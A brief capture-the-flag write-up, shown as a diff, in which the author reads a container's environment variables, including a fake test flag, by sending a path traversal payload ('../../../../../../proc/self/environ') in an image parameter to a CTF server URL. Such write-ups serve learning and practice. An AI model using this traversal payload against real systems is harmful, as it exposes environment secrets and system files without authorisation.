@@ -1,0 +1,14 @@
+Server says
+------------
+
+environment:
+      - FLAG="n00bz{f4k3_fl4g_f0r_t3st1ng}"
+
+
+It shows the user environment variable
+--------------------------------------
+/proc/self/environ is the same with the command #printenv
+
+Finally > http://24.199.110.35:40150/view?image=../../../../../../proc/self/environ
+
+We got a flag
